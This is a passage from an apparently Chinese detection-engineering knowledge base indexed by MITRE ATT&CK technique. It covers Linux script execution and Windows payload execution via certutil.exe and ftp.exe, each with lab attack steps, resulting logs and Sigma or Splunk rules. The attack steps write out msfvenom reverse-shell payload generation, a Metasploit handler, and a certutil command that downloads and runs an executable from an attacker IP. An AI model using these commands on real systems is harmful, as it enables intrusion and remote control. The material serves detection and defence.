\uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/hacker$ bash 1.bash</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>icbc@icbc:/$ cat /var/log/audit/audit.log</p> <p>type=SYSCALL msg=audit(1565352677.388:1524): arch=c000003e syscall=59 success=yes exit=0 a0=564608ddc330 a1=564608dbd8c0 a2=564608de3970 a3=8 items=2 ppid=2095 pid=2807 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=4 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"auditcmd\" type=EXECVE msg=audit(1565352677.388:1524): argc=2 a0=\"bash\" a1=\"1.bash\" type=CWD msg=audit(1565352677.388:1524): cwd=\"/hacker\" type=PATH msg=audit(1565352677.388:1524): item=0 name=\"/usr/bin/bash\" inode=2228277 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#splunk","title":"splunk\u89c4\u5219","text":"<p>index = linux sourcetype = linux_audit syscall = 59  | table host\uff0csyscall\uff0csyscall_name\uff0cexe\uff0cauid</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_6","title":"\u5efa\u8bae","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6211\u4eec\u53ea\u662f\u628a\u73af\u5883\u4e2d\u7684\u811a\u672c\u6267\u884c\u884c\u4e3a\u8bb0\u5f55\u4e0b\u6765\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u767d\u540d\u5355\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u6d88\u8017\u5927\u91cf\u7684\u7cbe\u529b\u7528\u4e8e\u5904\u7406\u8bef\u62a5\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059-004</p> <p>https://attack.mitre.org/techniques/T1059/004/</p> <p>Audit\u914d\u7f6e\u624b\u518c</p> <p>https://www.cnblogs.com/bldly1989/p/7204358.html</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Certutil.exe\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u6682\u65e0\u5408\u9002\u5206\u7c7b\uff0c\u7f6e\u653e\u5728\u6b64TID\u4e2d</p> <p>\u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Certutil.exe\u662f\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u4e00\u90e8\u5206\u5b89\u88c5\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u5de5\u5177\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u6076\u610fEXE\u6587\u4ef6\uff0c\u5e76\u83b7\u53d6meterpreter\u4f1a\u8bdd\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7\uff08sysmon\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#payloadexe","title":"\u751f\u6210payload.exe","text":"<p>\u901a\u8fc7msfvenom \u751f\u6210\u6076\u610f\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528start multi/handler\u83b7\u53d6\u76ee\u6807\u8ba1\u7b97\u673a\u53cd\u5411shell\u4f1a\u8bdd\u3002</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f exe &gt; shell.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<pre><code>msf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 1234\nlport =&gt; 1234\nmsf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:1234\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#http","title":"\u5f00\u542f\u5c0f\u578bhttp\u670d\u52a1","text":"<pre><code>root@12306Br0:~# python2 -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe &amp; shell.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>[*] Started reverse TCP handler on 192.168.126.146:1234\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 1 opened (192.168.126.146:1234 -&gt; 192.168.126.149:49172) at 2020-04-17 15:59:50 +0800\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>#sysmon\u65e5\u5fd7\nEventID: 1\nImage: C:\\Windows\\System32\\certutil.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: CertUtil.exe\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CertUtil.exe\nCommandLine: certutil.exe  -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe\n\n#win7\u5b89\u5168\u65e5\u5fd7\nEventID\uff1a4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID:0xbcc\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\certutil.exe\n\n#windows server 2008(\u4e0d\u542b2008)\u4ee5\u4e0a\u7cfb\u7edf\u53ef\u4ee5\u914d\u7f6e\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u8fbe\u5230\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u6548\u679c\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u5206\u6790\u3002\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u53ef\u7591\u7684Certutil\u547d\u4ee4\nstatus: experimental\ndescription: \u4f7f\u7528\u8bf8\u5982\u201cdecode\u201d\u5b50\u547d\u4ee4\u4e4b\u7c7b\u7684\u5b50\u547d\u4ee4\u68c0\u6d4b\u53ef\u7591\u7684Microsoft certutil\u6267\u884c\uff0c\u8be5\u5b50\u547d\u4ee4\u6709\u65f6\u7528\u4e8e\u4f7f\u7528\u5185\u7f6e\u7684certutil\u5b9e\u7528\u7a0b\u5e8f\nreferences:\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://twitter.com/subTee/status/888102593838362624\n    - https://twitter.com/subTee/status/888071631528235010\n    - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/\n    - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -decode *'\n            - '* /decode *'\n            - '* -decodehex *'\n            - '* /decodehex *'\n            - '* -urlcache *'\n            - '* /urlcache *'\n            - '* -verifyctl *'\n            - '* /verifyctl *'\n            - '* -encode *'\n            - '* /encode *'\n            - '*certutil* -URL*'\n            - '*certutil* /URL*'\n            - '*certutil* -ping*'\n            - '*certutil* /ping*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.t1140\n    - attack.t1105\n    - attack.t1059\n    - attack.s0189\n    - attack.g0007\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u5efa\u8bae","text":"<p>\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059</p> <p>https://attack.mitre.org/techniques/T1059/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Ftp.exe\u662fWindows\u672c\u8eab\u81ea\u5e26\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c5e\u4e8e\u5fae\u8f6fFTP\u5de5\u5177\uff0c\u63d0\u4f9b\u57fa\u672c\u7684FTP\u8bbf\u95ee\u3002</p> <p>\u8bf4\u660e\uff1aFtp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cFtp.exe\u547d\u4ee4\u53ef\u8bc6\u522b\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\ftp.exe</p> <p>C:\\Windows\\SysWOW64\\ftp.exe</p> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\ftp.exe</p> <p>C:\\Windows\\SysWOW64\\ftp.exe</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#payloadexe","title":"\u751f\u6210payload.exe","text":"<pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<p>\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b)</p> <pre><code>msf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 53\nlport =&gt; 53\nmsf5 exploit(multi/handler) &gt; set AutoRunScript migrate -f\nAutoRunScript =&gt; migrate -f\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u6267\u884cpayload","text":"<pre><code>ftp&gt;!C:\\Users\\12306Br0\\Desktop\\a\\payload.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:53\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 1 opened (192.168.126.146:53 -&gt; 192.168.126.149:49219) at 2020-04-18 20:08:18 +0800\n[*] Session ID 1 (192.168.126.146:53 -&gt; 192.168.126.149:49219) processing AutoRunScript 'migrate -f'\n[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.\n[!] Example: run post/windows/manage/migrate OPTION=value [...]\n[*] Current server process: payload.exe (2324)\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 2888\n[+] Successfully migrated to process\n\nmeterpreter &gt; getuid\nServer username: 12306Br0-PC\\12306Br0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>EventID:4688 #\u5b89\u5168\u65e5\u5fd7\uff0cwindows server 2012\u4ee5\u4e0a\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u5bf9\u547d\u4ee4\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x474\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmd.exe\n\nEventID:4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x3f8\n\u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\a\\payload.exe\n\nEventID:5156\n\u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f:\n\u8fdb\u7a0b ID: 1016\n\u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\users\\12306br0\\desktop\\a\\payload.exe\n\n\u7f51\u7edc\u4fe1\u606f:\n\u65b9\u5411: \u51fa\u7ad9\n\u6e90\u5730\u5740: 192.168.126.149\n\u6e90\u7aef\u53e3: 49221\n\u76ee\u6807\u5730\u5740: 192.168.126.146\n\u76ee\u6807\u7aef\u53e3: 53\n\u534f\u8bae: 6\n\nEventID:1 #sysmon\u65e5\u5fd7\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: C:\\Windows\\system32\\cmd.exe /C C:\\Users\\12306Br0\\Desktop\\a\\payload.exe\nCurrentDirectory: C:\\Windows\\system32\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}\nLogonId: 0x550ac\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8\nParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}\nParentProcessId: 1112\nParentImage: C:\\Windows\\System32\\ftp.exe\nParentCommandLine: ftp\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059</p> <p>https://attack.mitre.org/techniques/T1059/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Ftp.exe\u6267\u884cPayload</p> <p>https://www.77169.net/html/235306.html</p> <p>\u57fa\u4e8e\u767d\u540d\u5355\u7684Payload</p> 